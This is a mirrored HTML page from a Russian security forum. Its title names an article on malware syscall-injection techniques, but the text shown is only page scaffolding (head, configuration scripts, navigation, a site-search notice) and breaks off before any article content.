<!DOCTYPE html>
<html id="XF" lang="ru-RU" dir="LTR"
	data-xf="2.3"
	data-app="public"
	data-variation="alternate"
	data-color-scheme="dark"
	data-template="xa_ams_article_page_view"
	data-container-key="amsCategory-2"
	data-content-key=""
	data-logged-in="false"
	data-cookie-prefix="xf_"
	data-csrf="1758965536,42f90e9dd95238e0acc8fc7e65edaff7"
	class="has-no-js template-xa_ams_article_page_view"
	>

<!-- Mirrored from osint42.org/articles/tsikl-statei-izucheniye-vredonosnykh-programm.6/page/predel-naya-tekhnika-2-praktika-realizuyem-tekhniki-in-yektsii-cherez-siskoly.30/ by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 27 Sep 2025 09:42:30 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
<head>
	<link rel="icon" href="../../../../favicon.ico" type="image/x-icon">
	
	
	

	<meta charset="utf-8" />
	<title>Цикл статей &quot;Изучение вредоносных программ&quot; | Предельная техника-2. Практика. Реализуем техники инъекции через сисколы | Osint42.Org - Безопасность и код</title>
	<link rel="manifest" crossorigin="use-credentials" href="../../../../webmanifest.php">

	<meta http-equiv="X-UA-Compatible" content="IE=Edge" />
	<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">

	
		
			<meta name="theme-color" content="#0a1c29" />
		
	

	<meta name="apple-mobile-web-app-title" content="Osint42.Org - Безопасность и код">
	
		<link rel="apple-touch-icon" href="../../../../data/assets/logo/192192.png">
		

	
		
		<meta property="og:title" content="Предельная техника-2. Практика. Реализуем техники инъекции через сисколы | Цикл статей &quot;Изучение вредоносных программ&quot;" />
		<meta property="twitter:title" content="Предельная техника-2. Практика. Реализуем техники инъекции через..." />
	
	
		
		<meta name="description" content="В прошлой статье:Предельная техника. Разборка с сисколами | Цикл статей &quot;Изучение вредоносных программ&quot; мы разобрали теорию.

Давайте теперь переделаем..." />
		<meta property="og:description" content="В прошлой статье:Предельная техника. Разборка с сисколами | Цикл статей &quot;Изучение вредоносных программ&quot; мы разобрали теорию.

Давайте теперь переделаем техники..." />
		<meta property="twitter:description" content="В прошлой статье:Предельная техника. Разборка с сисколами | Цикл статей &quot;Изучение вредоносных программ&quot; мы разобрали теорию.

Давайте теперь переделаем техники..." />
	
	
		<meta property="og:type" content="article" />
	
		<meta property="og:url" content="index.html" />
	
		<link rel="canonical" href="index.html" />
	
		
		<meta property="og:image" content="1746786715233.png" />
		<meta property="twitter:image" content="1746786715233.png" />
		<meta property="twitter:card" content="summary_large_image" />
	
	

	
		
	
	
	<meta property="og:site_name" content="Osint42.Org - Безопасность и код" />


	
	
	
	
	
	

	
	
	
		
	
	

	<link rel="stylesheet" href="../../../../cssf1bd.css?css=public%3Anormalize.css%2Cpublic%3Afa.css%2Cpublic%3Avariations.less%2Cpublic%3Acore.less%2Cpublic%3Aapp.less&amp;s=1&amp;l=2&amp;d=1758392320&amp;k=650febe17d52673553ff8fcab924bc52ae7c26c5" />

	<link rel="stylesheet" href="../../../../css3cbc.css?css=public%3Aalnb_navigation.less%2Cpublic%3Abb_code.less%2Cpublic%3Aembed_resolver.less%2Cpublic%3Alightbox.less%2Cpublic%3Amessage.less%2Cpublic%3Anotices.less%2Cpublic%3Ashare_controls.less%2Cpublic%3Axa_ams.less%2Cpublic%3Axa_ams_comment.less%2Cpublic%3Aextra.less&amp;s=1&amp;l=2&amp;d=1758392320&amp;k=660f70198796b016e2fbc3737c197c9184e8d7a3" />


	
		<script data-cfasync="false" src="../../../../js/xf/preamble.minf74f.js?_v=01eb82fa"></script>
	

	
	<script data-cfasync="false" src="../../../../js/vendor/vendor-compiledf74f.js?_v=01eb82fa" defer></script>
	<script data-cfasync="false" src="../../../../js/xf/core-compiledf74f.js?_v=01eb82fa" defer></script>

	<script data-cfasync="false">
		XF.ready(() =>
		{
			XF.extendObject(true, XF.config, {
				// 
				userId: 0,
				enablePush: true,
				pushAppServerKey: 'BA479YFsUh5Dh5bOkTEWM7LoORrEgUroE2adYpgA6_NLt6AmfJFBdCBxt_i9NhpAIXJviINVU4JDqWxez0NnB-w',
				url: {
					fullBase: 'https://osint42.org/',
					basePath: '/',
					css: '/css.php?css=__SENTINEL__&s=1&l=2&d=1758392320',
					js: '/js/__SENTINEL__?_v=01eb82fa',
					icon: '/data/local/icons/__VARIANT__.svg?v=1757401797#__NAME__',
					iconInline: '/styles/fa/__VARIANT__/__NAME__.svg?v=5.15.3',
					keepAlive: '/login/keep-alive'
				},
				cookie: {
					path: '/',
					domain: '',
					prefix: 'xf_',
					secure: true,
					consentMode: 'disabled',
					consented: ["optional","_third_party"]
				},
				cacheKey: '60356f7aa4f82ca98e605b4e87a0a057',
				csrf: '1758965536,42f90e9dd95238e0acc8fc7e65edaff7',
				js: {"\/js\/xf\/lightbox-compiled.js?_v=01eb82fa":true,"\/js\/xf\/code_block-compiled.js?_v=01eb82fa":true,"\/js\/copycode\/copycode.min.js?_v=01eb82fa":true,"\/js\/DCom\/LiveContent\/4.4.1\/socket.io.min.js?_v=01eb82fa":true,"\/js\/DCom\/LiveContent\/socket-conv.min.js?_v=01eb82fa":true},
				fullJs: false,
				css: {"public:alnb_navigation.less":true,"public:bb_code.less":true,"public:embed_resolver.less":true,"public:lightbox.less":true,"public:message.less":true,"public:notices.less":true,"public:share_controls.less":true,"public:xa_ams.less":true,"public:xa_ams_comment.less":true,"public:extra.less":true},
				time: {
					now: 1758965536,
					today: 1758920400,
					todayDow: 6,
					tomorrow: 1759006800,
					yesterday: 1758834000,
					week: 1758402000,
					month: 1756674000,
					year: 1735678800
				},
				style: {
					light: 'default',
					dark: 'alternate',
					defaultColorScheme: 'light'
				},
				borderSizeFeature: '3px',
				fontAwesomeWeight: 'r',
				enableRtnProtect: true,
				
				enableFormSubmitSticky: true,
				imageOptimization: '0',
				imageOptimizationQuality: 0.85,
				uploadMaxFilesize: 3145728,
				uploadMaxWidth: 0,
				uploadMaxHeight: 0,
				allowedVideoExtensions: ["m4v","mov","mp4","mp4v","mpeg","mpg","ogv","webm"],
				allowedAudioExtensions: ["mp3","opus","ogg","wav"],
				shortcodeToEmoji: true,
				visitorCounts: {
					conversations_unread: '0',
					alerts_unviewed: '0',
					total_unread: '0',
					title_count: true,
					icon_indicator: true
				},
				jsMt: {"xf\/action.js":"dc2375bf","xf\/embed.js":"d3d00259","xf\/form.js":"d3d00259","xf\/structure.js":"dc2375bf","xf\/tooltip.js":"d3d00259"},
				jsState: {},
				publicMetadataLogoUrl: 'https://osint42.org/data/assets/logo/192192.png',
				publicPushBadgeUrl: 'https://osint42.org/styles/default/xenforo/bell.png'
			})

			XF.extendObject(XF.phrases, {
				// 
"svStandardLib_time.day": "{count} day",
"svStandardLib_time.days": "{count} дней",
"svStandardLib_time.hour": "{count} hour",
"svStandardLib_time.hours": "{count} часов",
"svStandardLib_time.minute": "{count} минут",
"svStandardLib_time.minutes": "{count} минут",
"svStandardLib_time.month": "{count} month",
"svStandardLib_time.months": "{count} месяцев",
"svStandardLib_time.second": "{count} second",
"svStandardLib_time.seconds": "{count} секунд",
"svStandardLib_time.week": "time.week",
"svStandardLib_time.weeks": "{count} недель",
"svStandardLib_time.year": "{count} year",
"svStandardLib_time.years": "{count} лет",
copy_to_clipboard: "Скопировать в буфер обмена",
text_copied_to_clipboard: "Текст скопирован в буфер обмена.",
				date_x_at_time_y:     "{date} в {time}",
				day_x_at_time_y:      "{day} в {time}",
				yesterday_at_x:       "Вчера в {time}",
				x_minutes_ago:        "{minutes} мин. назад",
				one_minute_ago:       "Минуту назад",
				a_moment_ago:         "Только что",
				today_at_x:           "Сегодня в {time}",
				in_a_moment:          "Через секунду",
				in_a_minute:          "Через минуту",
				in_x_minutes:         "Через {minutes} мин.",
				later_today_at_x:     "Сегодня в {time}",
				tomorrow_at_x:        "Завтра в {time}",
				short_date_x_minutes: "{minutes} м.",
				short_date_x_hours:   "{hours} ч.",
				short_date_x_days:    "{days} д.",

				day0: "Воскресенье",
				day1: "Понедельник",
				day2: "Вторник",
				day3: "Среда",
				day4: "Четверг",
				day5: "Пятница",
				day6: "Суббота",

				dayShort0: "Вс",
				dayShort1: "Пн",
				dayShort2: "Вт",
				dayShort3: "Ср",
				dayShort4: "Чт",
				dayShort5: "Пт",
				dayShort6: "Сб",

				month0: "Январь",
				month1: "Февраль",
				month2: "Март",
				month3: "Апрель",
				month4: "Май",
				month5: "Июнь",
				month6: "Июль",
				month7: "Август",
				month8: "Сентябрь",
				month9: "Октябрь",
				month10: "Ноябрь",
				month11: "Декабрь",

				active_user_changed_reload_page: "Ваша сессия истекла. Перезагрузите страницу.",
				server_did_not_respond_in_time_try_again: "Сервер не ответил вовремя. Пожалуйста, попробуйте снова.",
				oops_we_ran_into_some_problems: "Упс! Мы столкнулись с некоторыми проблемами.",
				oops_we_ran_into_some_problems_more_details_console: "Упс! Мы столкнулись с некоторыми проблемами. Пожалуйста, попробуйте позже. Более детальную информацию об ошибке Вы можете посмотреть в консоли браузера",
				file_too_large_to_upload: "Файл слишком большой для загрузки.",
				uploaded_file_is_too_large_for_server_to_process: "Загружаемый файл слишком большой для обработки сервером.",
				files_being_uploaded_are_you_sure: "Файлы ещё загружаются. Вы уверены, что хотите отправить эту форму?",
				attach: "Прикрепить файлы",
				rich_text_box: "Текстовое поле с поддержкой форматирования",
				close: "Закрыть",
				link_copied_to_clipboard: "Ссылка скопирована в буфер обмена.",
				text_copied_to_clipboard: "Текст скопирован в буфер обмена.",
				loading: "Загрузка...",
				you_have_exceeded_maximum_number_of_selectable_items: "Вы превысили максимальное количество выбираемых элементов.",

				processing: "Обработка",
				'processing...': "Обработка...",

				showing_x_of_y_items: "Показано {count} из {total} элементов",
				showing_all_items: "Показаны все элементы",
				no_items_to_display: "Нет элементов для отображения",

				number_button_up: "Увеличить",
				number_button_down: "Уменьшить",

				push_enable_notification_title: "Push-уведомления для сайта Osint42.Org - Безопасность и код успешно включены",
				push_enable_notification_body: "Спасибо за включение push-уведомлений!",

				pull_down_to_refresh: "Потяните вниз для обновления",
				release_to_refresh: "Отпустите для обновления",
				refreshing: "Обновление..."
			})
		})
	

window.addEventListener('DOMContentLoaded',()=>{XF.Push.updateUserSubscriptionParent=XF.Push.updateUserSubscription;XF.Push.updateUserSubscription=function(b,a){"unsubscribe"===a&&XF.browser.safari&&XF.Push.setPushHistoryUserIds({});XF.Push.updateUserSubscriptionParent(b,a)}});
</script>

	<script data-cfasync="false" src="../../../../js/xf/lightbox-compiledf74f.js?_v=01eb82fa" defer></script>
<script data-cfasync="false" src="../../../../js/xf/code_block-compiledf74f.js?_v=01eb82fa" defer></script>
<script data-cfasync="false" src="../../../../js/copycode/copycode.minf74f.js?_v=01eb82fa" defer></script>
<script data-cfasync="false" src="../../../../js/DCom/LiveContent/4.4.1/socket.io.minf74f.js?_v=01eb82fa" defer></script>
<script data-cfasync="false" src="../../../../js/DCom/LiveContent/socket-conv.minf74f.js?_v=01eb82fa" defer></script>



	
		<link rel="icon" type="image/png" href="../../../../data/assets/logo/favicon.png" sizes="32x32" />
	

	
	
</head>
<body data-template="xa_ams_article_page_view">

<div class="p-pageWrapper" id="top">

	

	<header class="p-header" id="header">
		<div class="p-header-inner">
			<div class="p-header-content">
				<div class="p-header-logo p-header-logo--image">
					<a href="../../../../forums/index.html">
						

	

	
		
		

		
	
		
		

		
	

	

	<picture data-variations="{&quot;default&quot;:{&quot;1&quot;:&quot;\/data\/assets\/logo_default\/osint4242.png&quot;,&quot;2&quot;:&quot;\/data\/assets\/logo_default\/osint4242.png&quot;},&quot;alternate&quot;:{&quot;1&quot;:&quot;\/data\/assets\/logo_alternate\/osint4242.png&quot;,&quot;2&quot;:&quot;\/data\/assets\/logo_alternate\/osint4242.png&quot;}}">
		
		
		

		

		<img src="../../../../data/assets/logo_alternate/osint4242.png" srcset="/data/assets/logo_alternate/osint4242.png 2x" width="100" height="36" alt="Osint42.Org - Безопасность и код"  />
	</picture>


					</a>
				</div>

				
			</div>
		</div>
	</header>

	
	

	
		<div class="p-navSticky p-navSticky--primary" data-xf-init="sticky-header">
			
		<nav class="p-nav">
			<div class="p-nav-inner">
				<button type="button" class="button button--plain p-nav-menuTrigger" data-xf-click="off-canvas" data-menu=".js-headerOffCanvasMenu" tabindex="0" aria-label="Меню"><span class="button-text">
					<i aria-hidden="true"></i>
				</span></button>

				<div class="p-nav-smallLogo">
					<a href="../../../../forums/index.html">
						

	

	
		
		

		
	
		
		

		
	

	

	<picture data-variations="{&quot;default&quot;:{&quot;1&quot;:&quot;\/data\/assets\/logo_default\/osint4242.png&quot;,&quot;2&quot;:null},&quot;alternate&quot;:{&quot;1&quot;:&quot;\/data\/assets\/logo_alternate\/osint4242.png&quot;,&quot;2&quot;:null}}">
		
		
		

		

		<img src="../../../../data/assets/logo_alternate/osint4242.png"  width="100" height="36" alt="Osint42.Org - Безопасность и код"  />
	</picture>


					</a>
				</div>

				<div class="p-nav-scroller hScroller" data-xf-init="h-scroller" data-auto-scroll=".p-navEl.is-selected">
					<div class="hScroller-scroll">
						<ul class="p-nav-list js-offCanvasNavSource">
							
								<li>
									
	<div class="p-navEl is-selected" data-has-children="true">
	

		
	
	<a href="../../../../index.html"
	class="p-navEl-link p-navEl-link--splitMenu "
	
	
	data-nav-id="xa_ams">Статьи</a>


		<a data-xf-key="1"
			data-xf-click="menu"
			data-menu-pos-ref="< .p-navEl"
			class="p-navEl-splitTrigger"
			role="button"
			tabindex="0"
			aria-label="Переключатель раскрытия"
			aria-expanded="false"
			aria-haspopup="true"></a>

		
	
		<div class="menu menu--structural" data-menu="menu" aria-hidden="true">
			<div class="menu-content">
				
					
	
	
	<a href="../../../../whats-new/ams-articles/index.html"
	class="menu-linkRow u-indentDepth0 js-offCanvasCopy "
	 rel="nofollow"
	
	data-nav-id="xa_amsNewArticles">Новые статьи</a>

	

				
					
	
	
	<a href="../../../../whats-new/ams-comments/index.html"
	class="menu-linkRow u-indentDepth0 js-offCanvasCopy "
	 rel="nofollow"
	
	data-nav-id="xa_amsNewComments">Новые комментарии</a>

	

				
					
	
	
	<a href="../../../authors/index.html"
	class="menu-linkRow u-indentDepth0 js-offCanvasCopy "
	
	
	data-nav-id="xa_amsAuthorList">Список авторов</a>

	

				
			</div>
		</div>
	
	</div>

								</li>
							
								<li>
									
	<div class="p-navEl " data-has-children="true">
	

		
	
	<a href="../../../../forums/index.html"
	class="p-navEl-link p-navEl-link--splitMenu "
	
	
	data-nav-id="forums">Форум</a>


		<a data-xf-key="2"
			data-xf-click="menu"
			data-menu-pos-ref="< .p-navEl"
			class="p-navEl-splitTrigger"
			role="button"
			tabindex="0"
			aria-label="Переключатель раскрытия"
			aria-expanded="false"
			aria-haspopup="true"></a>

		
	
		<div class="menu menu--structural" data-menu="menu" aria-hidden="true">
			<div class="menu-content">
				
					
	
	
	<a href="../../../../whats-new/posts/index.html"
	class="menu-linkRow u-indentDepth0 js-offCanvasCopy "
	
	
	data-nav-id="newPosts">Новые сообщения</a>

	

				
					
	
	
	<a href="../../../../search/index4009.html?type=post"
	class="menu-linkRow u-indentDepth0 js-offCanvasCopy "
	
	
	data-nav-id="searchForums">Поиск по форуму</a>

	

				
			</div>
		</div>
	
	</div>

								</li>
							
								<li>
									
	<div class="p-navEl " data-has-children="true">
	

		
	
	<a href="../../../../whats-new/index.html"
	class="p-navEl-link p-navEl-link--splitMenu "
	
	
	data-nav-id="whatsNew">Что нового</a>


		<a data-xf-key="3"
			data-xf-click="menu"
			data-menu-pos-ref="< .p-navEl"
			class="p-navEl-splitTrigger"
			role="button"
			tabindex="0"
			aria-label="Переключатель раскрытия"
			aria-expanded="false"
			aria-haspopup="true"></a>

		
	
		<div class="menu menu--structural" data-menu="menu" aria-hidden="true">
			<div class="menu-content">
				
					
	
	
	<a href="../../../../whats-new/posts/index.html"
	class="menu-linkRow u-indentDepth0 js-offCanvasCopy "
	 rel="nofollow"
	
	data-nav-id="whatsNewPosts">Новые сообщения</a>

	

				
					
	
	
	<a href="../../../../whats-new/ams-articles/index.html"
	class="menu-linkRow u-indentDepth0 js-offCanvasCopy "
	 rel="nofollow"
	
	data-nav-id="xaAmsWhatsNewNewArticles">Новые статьи</a>

	

				
					
	
	
	<a href="../../../../whats-new/media/index.html"
	class="menu-linkRow u-indentDepth0 js-offCanvasCopy "
	 rel="nofollow"
	
	data-nav-id="xfmgWhatsNewNewMedia">Новые медиа</a>

	

				
					
	
	
	<a href="../../../../whats-new/ams-comments/index.html"
	class="menu-linkRow u-indentDepth0 js-offCanvasCopy "
	 rel="nofollow"
	
	data-nav-id="xaAmsWhatsNewArticleComments">Новые комментарии к статье</a>

	

				
			</div>
		</div>
	
	</div>

								</li>
							
								<li>
									
	<div class="p-navEl " data-has-children="true">
	

		
	
	<a href="../../../../media/index.html"
	class="p-navEl-link p-navEl-link--splitMenu "
	
	
	data-nav-id="xfmg">Медиа</a>


		<a data-xf-key="4"
			data-xf-click="menu"
			data-menu-pos-ref="< .p-navEl"
			class="p-navEl-splitTrigger"
			role="button"
			tabindex="0"
			aria-label="Переключатель раскрытия"
			aria-expanded="false"
			aria-haspopup="true"></a>

		
	
		<div class="menu menu--structural" data-menu="menu" aria-hidden="true">
			<div class="menu-content">
				
					
	
	
	<a href="../../../../whats-new/media/index.html"
	class="menu-linkRow u-indentDepth0 js-offCanvasCopy "
	 rel="nofollow"
	
	data-nav-id="xfmgNewMedia">Новые медиа</a>

	

				
					
	
	
	<a href="../../../../whats-new/media-comments/index.html"
	class="menu-linkRow u-indentDepth0 js-offCanvasCopy "
	 rel="nofollow"
	
	data-nav-id="xfmgNewComments">Новые комментарии</a>

	

				
					
	
	
	<a href="../../../../search/index4784.html?type=xfmg_media"
	class="menu-linkRow u-indentDepth0 js-offCanvasCopy "
	
	
	data-nav-id="xfmgSearchMedia">Поиск медиа</a>

	

				
			</div>
		</div>
	
	</div>

								</li>
							
								<li>
									
	<div class="p-navEl " data-has-children="true">
	

		
	
	<a href="https://osint42.org/members/"
	class="p-navEl-link p-navEl-link--splitMenu "
	
	
	data-nav-id="members">Пользователи</a>


		<a data-xf-key="5"
			data-xf-click="menu"
			data-menu-pos-ref="< .p-navEl"
			class="p-navEl-splitTrigger"
			role="button"
			tabindex="0"
			aria-label="Переключатель раскрытия"
			aria-expanded="false"
			aria-haspopup="true"></a>

		
	
		<div class="menu menu--structural" data-menu="menu" aria-hidden="true">
			<div class="menu-content">
				
					
	
	
	<a href="https://osint42.org/online/"
	class="menu-linkRow u-indentDepth0 js-offCanvasCopy "
	
	
	data-nav-id="currentVisitors">Сейчас на форуме</a>

	

				
			</div>
		</div>
	
	</div>

								</li>
							
						</ul>
					</div>
				</div>

				<div class="p-nav-opposite">
					<div class="p-navgroup p-account p-navgroup--guest">
						
							<a href="../../../../login/index.html" class="p-navgroup-link p-navgroup-link--textual p-navgroup-link--logIn"
								data-xf-click="overlay" data-follow-redirects="on">
								<span class="p-navgroup-linkText">Вход</span>
							</a>
							
								<a href="../../../../register/index.html" class="p-navgroup-link p-navgroup-link--textual p-navgroup-link--register"
									data-xf-click="overlay" data-follow-redirects="on">
									<span class="p-navgroup-linkText">Регистрация</span>
								</a>
							
						
					</div>
					
					
    <a href="https://osint42.org/misc/style-variation"
       class="p-navgroup-link p-navgroup-link--iconic js-styleVariationsLink"
       data-xf-click="menu"
       data-menu-pos-ref="< .p-navgroup"
       aria-label=" Выбор стиля"
       aria-expanded="false"
       aria-haspopup="true"
       title=" Выбор стиля">
        <i aria-hidden="true">
            <i class="fa--xf far fa-moon "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../../../data/local/icons/regulare419.svg?v=1757401797#moon"></use></svg></i>
        </i>
        <span class="p-navgroup-linkText"> Выбор стиля</span>
    </a>

    <div class="menu menu--structural" data-menu="menu" aria-hidden="true">
        <div class="menu-content js-styleVariationsMenu">
            

	
		

	<a href="https://osint42.org/misc/style-variation?reset=1&amp;t=1758965536%2C42f90e9dd95238e0acc8fc7e65edaff7"
		class="menu-linkRow "
		rel="nofollow"
		data-xf-click="style-variation" data-variation="">

		<i class="fa--xf far fa-adjust "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../../../data/local/icons/regulare419.svg?v=1757401797#adjust"></use></svg></i>

		
			Системный
		
	</a>


		

	<a href="https://osint42.org/misc/style-variation?variation=default&amp;t=1758965536%2C42f90e9dd95238e0acc8fc7e65edaff7"
		class="menu-linkRow "
		rel="nofollow"
		data-xf-click="style-variation" data-variation="default">

		<i class="fa--xf far fa-sun "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../../../data/local/icons/regulare419.svg?v=1757401797#sun"></use></svg></i>

		
			Светлый
		
	</a>


		

	<a href="https://osint42.org/misc/style-variation?variation=alternate&amp;t=1758965536%2C42f90e9dd95238e0acc8fc7e65edaff7"
		class="menu-linkRow is-selected"
		rel="nofollow"
		data-xf-click="style-variation" data-variation="alternate">

		<i class="fa--xf far fa-moon "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../../../data/local/icons/regulare419.svg?v=1757401797#moon"></use></svg></i>

		
			Тёмный
		
	</a>

	

	
		
	

        </div>
    </div>



					<div class="p-navgroup p-discovery">
						<a href="../../../../whats-new/index.html"
							

	class="p-navgroup-link p-navgroup-link--iconic p-navgroup-link--whatsnew"

							aria-label="Что нового"
							title="Что нового">
							<i aria-hidden="true"></i>
							<span class="p-navgroup-linkText">Что нового</span>
						</a>

						
							<a href="../../../../search/index.html"
								class="p-navgroup-link p-navgroup-link--iconic p-navgroup-link--search"
								data-xf-click="menu"
								data-xf-key="/"
								aria-label="Поиск"
								aria-expanded="false"
								aria-haspopup="true"
								title="Поиск">
								<i aria-hidden="true"></i>
								<span class="p-navgroup-linkText">Поиск</span>
							</a>
							<div class="menu menu--structural menu--wide" data-menu="menu" aria-hidden="true">
								<form action="https://osint42.org/search/search" method="post"
									class="menu-content"
									data-xf-init="quick-search">

									<h3 class="menu-header">Поиск</h3>
									
									<div class="menu-row">
										
											<div class="inputGroup inputGroup--joined">
												<input type="text" class="input" name="keywords" data-acurl="/search/auto-complete" placeholder="Поиск..." aria-label="Поиск" data-menu-autofocus="true" />
												
			<select name="constraints" class="js-quickSearch-constraint input" aria-label="Поиск в">
				<option value="">Везде</option>
<option value="{&quot;search_type&quot;:&quot;ams_article&quot;}">Статьи</option>
<option value="{&quot;search_type&quot;:&quot;ams_article&quot;,&quot;c&quot;:{&quot;categories&quot;:[2],&quot;child_categories&quot;:1}}">Эта категория</option>

			</select>
		
											</div>
										
									</div>

									
									<div class="menu-row">
										<label class="iconic"><input type="checkbox"  name="c[title_only]" value="1" /><i aria-hidden="true"></i><span class="iconic-label">Искать только в заголовках

													
													<span tabindex="0" role="button"
														data-xf-init="tooltip" data-trigger="hover focus click" title="Теги также будут учитываться">

														<i class="fa--xf far fa-question-circle  u-muted u-smaller"><svg xmlns="http://www.w3.org/2000/svg" role="img" ><title>Примечание</title><use href="../../../../data/local/icons/regulare419.svg?v=1757401797#question-circle"></use></svg></i>
													</span></span></label>

									</div>
									
									<div class="menu-row">
										<div class="inputGroup">
											<span class="inputGroup-text" id="ctrl_search_menu_by_member">Автор:</span>
											<input type="text" class="input" name="c[users]" data-xf-init="auto-complete" placeholder="Пользователь" aria-labelledby="ctrl_search_menu_by_member" />
										</div>
									</div>
									<div class="menu-footer">
									<span class="menu-footer-controls">
										<button type="submit" class="button button--icon button--icon--search button--primary"><i class="fa--xf far fa-search "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../../../data/local/icons/regulare419.svg?v=1757401797#search"></use></svg></i><span class="button-text">Найти</span></button>
										<button type="submit" class="button " name="from_search_menu"><span class="button-text">Расширенный поиск...</span></button>
									</span>
									</div>

									<input type="hidden" name="_xfToken" value="1758965536,42f90e9dd95238e0acc8fc7e65edaff7" />
								</form>
							</div>
						
					</div>
				</div>
			</div>
		</nav>
	
		</div>
		
		
			<div class="p-sectionLinks">
				<div class="p-sectionLinks-inner hScroller" data-xf-init="h-scroller">
					<div class="hScroller-scroll">
						<ul class="p-sectionLinks-list">
							
								<li>
									
	<div class="p-navEl " >
	

		
	
	<a href="../../../../whats-new/ams-articles/index.html"
	class="p-navEl-link "
	 rel="nofollow"
	data-xf-key="alt+1"
	data-nav-id="xa_amsNewArticles">Новые статьи</a>


		

		
	
	</div>

								</li>
							
								<li>
									
	<div class="p-navEl " >
	

		
	
	<a href="../../../../whats-new/ams-comments/index.html"
	class="p-navEl-link "
	 rel="nofollow"
	data-xf-key="alt+2"
	data-nav-id="xa_amsNewComments">Новые комментарии</a>


		

		
	
	</div>

								</li>
							
								<li>
									
	<div class="p-navEl " >
	

		
	
	<a href="../../../authors/index.html"
	class="p-navEl-link "
	
	data-xf-key="alt+3"
	data-nav-id="xa_amsAuthorList">Список авторов</a>


		

		
	
	</div>

								</li>
							
						</ul>
					</div>
				</div>
			</div>
			
	
		

	<div class="offCanvasMenu offCanvasMenu--nav js-headerOffCanvasMenu" data-menu="menu" aria-hidden="true" data-ocm-builder="navigation">
		<div class="offCanvasMenu-backdrop" data-menu-close="true"></div>
		<div class="offCanvasMenu-content">
			<div class="offCanvasMenu-header">
				Меню
				<a class="offCanvasMenu-closer" data-menu-close="true" role="button" tabindex="0" aria-label="Закрыть"></a>
			</div>
			
				<div class="p-offCanvasRegisterLink">
					<div class="offCanvasMenu-linkHolder">
						<a href="../../../../login/index.html" class="offCanvasMenu-link" data-xf-click="overlay" data-menu-close="true">
							Вход
						</a>
					</div>
					<hr class="offCanvasMenu-separator" />
					
						<div class="offCanvasMenu-linkHolder">
							<a href="../../../../register/index.html" class="offCanvasMenu-link" data-xf-click="overlay" data-menu-close="true">
								Регистрация
							</a>
						</div>
						<hr class="offCanvasMenu-separator" />
					
				</div>
			
			<div class="js-offCanvasNavTarget"></div>
			<div class="offCanvasMenu-installBanner js-installPromptContainer" style="display: none;" data-xf-init="install-prompt">
				<div class="offCanvasMenu-installBanner-header">Установить приложение</div>
				<button type="button" class="button js-installPromptButton"><span class="button-text">Установить</span></button>
				<template class="js-installTemplateIOS">
					<div class="js-installTemplateContent">
						<div class="overlay-title">Как установить приложение на iOS</div>
						<div class="block-body">
							<div class="block-row">
								<p>
									Следуйте инструкциям в видео ниже, чтобы узнать, как установить наш сайт как веб-приложение на главный экран вашего устройства.
								</p>
								<p style="text-align: center">
									<video src="../../../../styles/default/xenforo/add_to_home_new.mp4"
										width="280" height="480" autoplay loop muted playsinline></video>
								</p>
								<p>
									<small><strong>Примечание:</strong> Эта функция может быть недоступна в некоторых браузерах.</small>
								</p>
							</div>
						</div>
					</div>
				</template>
			</div>
		</div>
	</div>

	<div class="p-body">
		<div class="p-body-inner">
			<!--XF:EXTRA_OUTPUT-->


			
				
	
		
		

		<ul class="notices notices--block  js-notices"
			data-xf-init="notices"
			data-type="block"
			data-scroll-interval="6">

			
				
	<li class="notice js-notice notice--primary notice--hasImage"
		data-notice-id="1"
		data-delay-duration="0"
		data-display-duration="0"
		data-auto-dismiss=""
		data-visibility="">

		
			<div class="notice-image"><img src="../../../../data/assets/notice_images/c7eb1746-6291-4d37-b72b-8e3b5cfd1303.png" alt="" /></div>
		
		<div class="notice-content">
			
			<div class="block"
     style="border:1px solid #ccc;
            border-radius:8px;
            padding:min(4vw,15px);
            background:var(--xf-contentBg);
            box-shadow:0 0 8px rgba(0,0,0,.1);
            width:100%;
            max-width:clamp(480px,90vw,1200px);
            margin:0 auto;
            box-sizing:border-box;
            overflow:hidden;">

  <div class="block-container">
    <h3 class="block-header"
        style="font-size:clamp(1rem,4vw,1.125rem);
               margin:0 0 10px 0;">
      📡 Контакты и поиск по сайту в Яндекс
    </h3>

    <div class="block-body" style="line-height:1.4;">

      <!-- Email -->
      <p style="margin:8px 0;">
        ✉️ Email:
        <a href="../../../../cdn-cgi/l/email-protection.html#462f2820290629352f283272746825292b" style="color:#2ecc71;
                  font-weight:bold;
                  overflow-wrap:anywhere;
                  text-decoration:none;">
          <span class="__cf_email__" data-cfemail="8ce5e2eae3cce3ffe5e2f8b8bea2efe3e1">[email&#160;protected]</span>
        </a>
      </p>

      <div class="ya-site-form ya-site-form_inited_no" data-bem="{&quot;action&quot;:&quot;https://yandex.ru/search/site/&quot;,&quot;arrow&quot;:false,&quot;bg&quot;:&quot;transparent&quot;,&quot;fontsize&quot;:12,&quot;fg&quot;:&quot;#000000&quot;,&quot;language&quot;:&quot;ru&quot;,&quot;logo&quot;:&quot;rb&quot;,&quot;publicname&quot;:&quot;Поиск по osint42.com&quot;,&quot;suggest&quot;:true,&quot;target&quot;:&quot;_blank&quot;,&quot;tld&quot;:&quot;ru&quot;,&quot;type&quot;:2,&quot;usebigdictionary&quot;:true,&quot;searchid&quot;:13900241,&quot;input_fg&quot;:&quot;#000000&quot;,&quot;input_bg&quot;:&quot;#ffffff&quot;,&quot;input_fontStyle&quot;:&quot;normal&quot;,&quot;input_fontWeight&quot;:&quot;normal&quot;,&quot;input_placeholder&quot;:&quot;Поиск по сайту в Яндекс&quot;,&quot;input_placeholderColor&quot;:&quot;#000000&quot;,&quot;input_borderColor&quot;:&quot;#7f9db9&quot;}"><form action="https://yandex.ru/search/site/" method="get" target="_blank" accept-charset="utf-8"><input type="hidden" name="searchid" value="13900241"/><input type="hidden" name="l10n" value="ru"/><input type="hidden" name="reqenc" value=""/><input type="search" name="text" value=""/><input type="submit" value="Найти"/></form></div><style type="text/css">.ya-page_js_yes .ya-site-form_inited_no { display: none; }</style><script type="text/javascript">(function(w,d,c){var 